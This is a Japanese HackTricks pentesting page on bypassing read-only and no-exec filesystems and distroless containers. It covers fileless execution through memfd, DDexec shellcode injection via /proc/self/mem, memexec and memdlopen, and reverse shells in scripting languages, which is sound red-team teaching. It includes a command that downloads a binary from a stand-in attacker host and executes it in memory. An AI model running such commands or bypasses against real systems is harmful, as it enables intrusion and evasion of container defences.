# FS保護のバイパス：読み取り専用 / 実行不可 / Distroless

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 読み取り専用 / 実行不可のシナリオ

**読み取り専用（ro）ファイルシステム保護**が、特にコンテナ内でLinuxマシンによく見られるようになっています。これは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで、roファイルシステムでコンテナを実行できるためです。

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能なままですので、ディスクに何も書き込めないわけではありません。ただし、このフォルダは**実行不可の保護**でマウントされるため、ここにバイナリをダウンロードしても**実行できません**。

{% hint style="warning" %}
レッドチームの観点からすると、これにより、システムに既に存在しないバイナリ（バックドアや`kubectl`のようなエンティティ）を**ダウンロードして実行するのが困難**になります。
{% endhint %}

## 最も簡単なバイパス：スクリプト

バイナリと言及しましたが、**インタプリタがマシン内にある限り、シェルスクリプト**（`sh`が存在する場合）や**Pythonスクリプト**（`python`がインストールされている場合）など、**任意のスクリプトを実行**できます。

ただし、これだけではバイナリバックドアや他のバイナリツールを実行するのには十分ではありません。

## メモリバイパス

ファイルシステムが実行を許可していない場合にバイナリを実行したい場合、最も簡単な方法は、**メモリから実行**することです。なぜなら、**保護はメモリ内では適用されない**からです。

### FD + execシスコールバイパス

**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがマシン内にある場合、バイナリをメモリにダウンロードして実行することができます。これは、メモリファイルディスクリプタ（`create_memfd`シスコール）に保存し、これらの保護によって保護されないためです。その後、**`exec`シスコール**を呼び出して、**ファイルとして実行**するために**fdを指定**します。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、バイナリを**圧縮してb64エンコード**し、`create_memfd`シスコールを呼び出して作成された**fd**に**デコードおよび展開**するための指示を含む指定された言語のスクリプトを生成します。その後、**exec**シスコールを呼び出して実行します。

{% hint style="warning" %}
これは、PHPやNodeなどの他のスクリプト言語では機能しません。これらの言語では、スクリプトから**生のシスコールを呼び出すデフォルトの方法**がないため、バイナリを保存するための**メモリfd**を作成するために`create_memfd`を呼び出すことはできません。

また、`/dev/shm`内のファイルを持つ**通常のfd**を作成しても機能しません。**実行不可の保護**が適用されるため、実行することは許可されません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術です。

したがって、プロセスが実行している**アセンブリコードを制御**することで、**シェルコード**を書き込み、プロセスを**任意のコードを実行**するように「変異」させることができます。

{% hint style="success" %}
**DDexec / EverythingExec**を使用すると、**メモリ**から自分自身の**シェルコード**または**任意のバイナリ**を**ロードして実行**できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
詳細な情報については、Githubを参照するか、以下のリンクを参照してください：

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)は、DDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したものであり、異なるバイナリを実行するためにDDexecを再起動する必要はありません。代わりに、DDexecのテクニックを使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**することができます。

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)には、**memexecを使用してPHPリバースシェルからバイナリを実行する**例があります。

### Memdlopen

DDexecと同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen)テクニックは、メモリにバイナリをロードして後で実行するためのより簡単な方法を提供します。これにより、依存関係を持つバイナリをロードすることも可能になります。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、ライブラリやランタイムの依存関係など、特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネントのみが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。

Distrolessコンテナの目標は、不要なコンポーネントを排除することにより、コンテナの攻撃面を**減らし、悪用できる脆弱性の数を最小限に抑える**ことです。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などは**見つからない**かもしれません。また、通常システムで実行する`ls`、`whoami`、`id`などのバイナリも見つかりません。

{% hint style="warning" %}
したがって、通常どおりに**リバースシェルを取得したり**システムを**列挙したりすることはできません**。
{% endhint %}

ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされており、したがって**Pythonリバースシェル**を取得することができます。Nodeを実行している場合はNodeリバースシェルを取得できますし、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用することで、言語の機能を利用してシステムを**列挙**することができます。
{% endhint %}

**読み取り専用/実行不可**の保護がない場合、リバースシェルを悪用してバイナリをファイルシステムに**書き込み**、**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常これらの保護が存在するため、**以前のメモリ実行技術を使用してこれらの保護をバイパス**することができます。
{% endhint %}

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)には、スクリプト言語の**リバースシェル**を取得し、メモリからバイナリを実行するための**いくつかのRCE脆弱性を悪用する**例があります。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
